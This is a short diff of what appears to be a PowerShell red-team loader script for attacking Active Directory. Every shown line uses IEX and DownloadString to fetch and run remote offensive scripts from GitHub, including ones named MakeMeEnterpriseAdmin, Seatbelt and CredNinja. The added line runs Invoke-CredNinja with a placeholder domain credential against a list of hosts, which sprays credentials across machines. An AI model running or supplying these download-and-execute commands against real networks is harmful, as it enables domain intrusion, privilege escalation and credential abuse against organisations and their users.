@@ -25,7 +25,7 @@ IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/mas
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/MakeMeEnterpriseAdmin.ps1'));
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Seatbelt.ps1'));
 IEX($browser.DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1'));Import-ActiveDirectory
-IEX($browser.DownloadString('https://raw.githubusercontent.com/Raikia/CredNinja/master/Invoke-CredNinja.ps1'));
+IEX($browser.DownloadString('https://raw.githubusercontent.com/Raikia/CredNinja/master/Invoke-CredNinja.ps1'));Invoke-CredNinja -Credentials 'domain\user:pass' -Hosts computers.txt
 IEX($browser.DownloadString(''));
 IEX($browser.DownloadString(''));
 
